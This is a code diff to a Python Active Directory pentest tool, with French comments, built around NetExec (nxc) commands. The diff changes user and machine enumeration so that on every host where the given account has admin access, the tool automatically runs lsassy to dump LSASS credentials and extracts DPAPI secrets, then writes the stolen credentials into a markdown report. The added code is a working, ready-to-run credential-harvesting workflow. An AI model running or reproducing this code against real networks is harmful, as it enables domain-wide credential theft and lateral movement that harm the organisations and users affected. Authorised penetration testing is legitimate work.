@@ -456,37 +456,111 @@ def ask_to_save(data, default_name):
         print(colored("📬 List not saved.", "yellow"))
 
 def get_users():
+    # Essayer d'abord avec LDAP
     command = '''nxc ldap $IP -u $USER -p $PASSWORD --users'''
     lines = run_command(command, use_network=False, use_dc=True)
     users = []
+    
+    # Si LDAP ne retourne rien, utiliser SMB
+    if not lines:
+        command = '''nxc smb $IP -u $USER -p $PASSWORD --users'''
+        lines = run_command(command, use_network=False, use_dc=True)
+    
     for line in lines:
+        # Ignorer les lignes d'en-tête et les comptes système
         if (
-            line.startswith("LDAP")
-            and not any(excl in line for excl in [
+            not any(excl in line for excl in [
                 "-Username-", "krbtgt", "Guest", "DefaultAccount",
-                "WDAGUtilityAccount", "[+]", "[*]"
+                "WDAGUtilityAccount", "[+]", "[*]", "LDAP", "SMB",
+                "Windows", "Enumerated", "name:", "domain:", "signing:"
             ])
+            and line.strip()
+            and not line.startswith("SMB")
         ):
+            # Extraire le nom d'utilisateur
             parts = line.split()
-            if len(parts) >= 5:
-                users.append(parts[4])
+            if len(parts) >= 1:
+                user = parts[0].strip()
+                if user and not user.startswith(("SMB", "[*]", "[+]")):
+                    users.append(user)
+    
     return sorted(set(users))
 
 def get_machines(with_versions=False):
     command = '''nxc smb $IP -u $USER -p $PASSWORD'''
-    lines = run_command(command, use_network=False, use_dc=True)
+    lines = run_command(command, use_network=True, use_dc=False)
     hosts = {}
+    admin_hosts = []
+    admin_results = {}
+    
+    if not with_versions:
+        print(colored("\n🔍 Scanning for machines...", "cyan"))
+    
     for line in lines:
-        match_name = re.search(r'\(name:([^)]+)\)', line)
-        if match_name:
-            hostname = match_name.group(1).strip()
+        # Recherche du nom d'hôte et de l'IP
+        hostname_match = re.search(r'SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+(\w+)', line)
+        if hostname_match:
+            ip = hostname_match.group(1)
+            hostname = hostname_match.group(2)
+            
+            if "(admin)" in line:
+                admin_hosts.append((ip, hostname))
+                if not with_versions:
+                    print(colored("\n" + "="*50, "red"))
+                    print(colored(f"🔰 ADMIN ACCESS DETECTED 🔰", "red", attrs=["bold"]))
+                    print(colored(f"Target: {hostname} ({ip})", "red"))
+                    print(colored("="*50 + "\n", "red"))
+            
             if with_versions:
                 os_match = re.search(r'\[\*\] (.*?) \(name:', line)
                 os_info = os_match.group(1).strip() if os_match else "Unknown OS"
                 hosts[hostname] = os_info
             else:
                 hosts[hostname] = None
-    return hosts
+    
+    if admin_hosts and not with_versions:
+        print(colored(f"\n🎯 Found {len(admin_hosts)} host(s) with admin access. Starting privilege escalation checks...", "yellow"))
+        
+        for admin_ip, hostname in admin_hosts:
+            print(colored(f"\n{'='*50}", "cyan"))
+            print(colored(f"🔍 Target: {hostname} ({admin_ip})", "cyan", attrs=["bold"]))
+            print(colored(f"{'='*50}", "cyan"))
+            
+            admin_results[hostname] = {"ip": admin_ip, "lsassy": [], "dpapi": []}
+            
+            # Exécuter lsassy
+            print(colored("\n📊 Running LSASSY dump...", "yellow"))
+            lsassy_command = f'''nxc smb {admin_ip} -u $USER -p $PASSWORD -M lsassy'''
+            lsassy_results = run_command(lsassy_command)
+            
+            found_creds = False
+            for line in lsassy_results:
+                if "LSASSY" in line and not any(x in line for x in ["[*]", "[+]"]):
+                    found_creds = True
+                    print(colored(f"  {line}", "green"))
+                    admin_results[hostname]["lsassy"].append(line.strip())
+            
+            if not found_creds:
+                print(colored("  ℹ️  No credentials found with LSASSY", "yellow"))
+            
+            # Exécuter dpapi
+            print(colored("\n🔐 Running DPAPI check...", "yellow"))
+            dpapi_command = f'''nxc smb {admin_ip} -u $USER -p $PASSWORD --dpapi'''
+            dpapi_results = run_command(dpapi_command)
+            
+            found_dpapi = False
+            for line in dpapi_results:
+                if "[SYSTEM][CREDENTIAL]" in line:
+                    found_dpapi = True
+                    print(colored(f"  {line}", "green"))
+                    admin_results[hostname]["dpapi"].append(line.strip())
+            
+            if not found_dpapi:
+                print(colored("  ℹ️  No DPAPI credentials found", "yellow"))
+            
+            print(colored(f"\n{'='*50}", "cyan"))
+    
+    return hosts, admin_results
 
 def get_groups():
     command = '''nxc ldap $IP -u $USER -p $PASSWORD --groups'''
@@ -1059,8 +1133,8 @@ def full_report():
     groups = get_groups()
     
     print(colored("▶️  Retrieving computers...", "cyan"))
-    machines = get_machines()
-    machines_os = get_machines(with_versions=True)
+    machines, admin_results = get_machines()
+    machines_os = get_machines(with_versions=True)[0]
     
     print(colored("▶️  Retrieving logged-on users (Targeted DC)...", "cyan"))
     loggedon = get_loggedon_users()
@@ -1120,6 +1194,25 @@ def full_report():
             md.append(f"{host}  — {osinfo}")
         md.append("")
 
+    if admin_results:
+        md.append("## 🔰 Admin Access & Privilege Escalation\n")
+        for hostname, results in admin_results.items():
+            md.append(f"### {hostname} ({results['ip']})\n")
+            
+            if results["lsassy"]:
+                md.append("#### 📊 LSASSY Dump Results\n```")
+                for cred in results["lsassy"]:
+                    md.append(cred)
+                md.append("```\n")
+            
+            if results["dpapi"]:
+                md.append("#### 🔐 DPAPI Credentials\n```")
+                for cred in results["dpapi"]:
+                    md.append(cred)
+                md.append("```\n")
+        
+        md.append("")
+
     if loggedon:
         md.append("## 💻 Active Users \n")
         for host, info in loggedon.items():
@@ -1151,7 +1244,6 @@ def full_report():
         in_code_block = False
         
         for line in adcs_vulns:
-            # Si c'est une nouvelle section principale (CA ou Templates)
             if line.startswith("_[") and any(x in line for x in ["Certificate Authorities", "Certificate Templates"]):
                 if in_code_block:
                     md.append("```\n")
@@ -1161,7 +1253,6 @@ def full_report():
                 md.append(f"\n### {section_name}\n")
                 current_section = section_name.split()[0]
                 
-            # Si c'est un nouveau template
             elif line.startswith("Template:"):
                 if in_code_block:
                     md.append("```\n")
@@ -1172,7 +1263,6 @@ def full_report():
                 md.append("```")
                 in_code_block = True
                 
-            # Si c'est une sous-section d'un template
             elif line.startswith("_[") and any(x in line for x in ["Enrollment Flags", "Private Key Flags", "Extended Key Usage", "Enrollment Rights", "Vulnerabilities"]):
                 if in_code_block:
                     md.append("```\n")
@@ -1183,7 +1273,6 @@ def full_report():
                 md.append("```")
                 in_code_block = True
                 
-            # Si c'est un lien de documentation ou une exploitation
             elif line.startswith("📖 Documentation:") or line.startswith("💡 Exploitation:"):
                 if in_code_block:
                     md.append("```")
@@ -1193,14 +1282,12 @@ def full_report():
                     md.append("\n```")
                     in_code_block = True
             
-            # Pour toutes les autres lignes
             else:
                 if not in_code_block:
                     md.append("```")
                     in_code_block = True
                 md.append(line)
         
-        # Fermer le dernier bloc de code si nécessaire
         if in_code_block:
             md.append("```\n")
     else:
@@ -1347,7 +1434,7 @@ def main():
 
     elif args.os:
         results = get_machines(with_versions=True)
-        output = [f"{host} — {osinfo}" for host, osinfo in results.items()]
+        output = [f"{host} — {osinfo}" for host, osinfo in results[0].items()]
         print("\n".join(output))
         ask_to_save(output, "machines_with_os.txt")
 
